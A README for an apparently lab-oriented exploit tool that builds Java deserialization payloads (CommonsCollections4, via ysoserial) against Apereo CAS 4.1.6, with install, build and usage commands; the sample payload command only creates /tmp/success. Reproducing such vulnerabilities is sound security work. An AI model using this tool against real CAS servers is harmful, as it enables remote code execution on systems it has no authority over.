# Apereo-CAS attack

## Download

[Click here](https://github.com/vulhub/Apereo-CAS-Attack/releases) to download latest binary JAR archive.

## Installation

Steps to install:

- Download [ysoserial](https://github.com/frohoff/ysoserial) to `ysoserial-master-30099844c6-1.jar`
- Install it to local maven:

```
mvn org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file -Dfile=ysoserial-master-30099844c6-1.jar -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=0.0.6 -Dpackaging=jar -DlocalRepositoryPath=my-repo
```

- Build JAR file:

```
mvn clean package assembly:single
```

## Usage

Generate a `CommonsCollections4` Payload for Apereo-CAS 4.1.6:

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
``` 
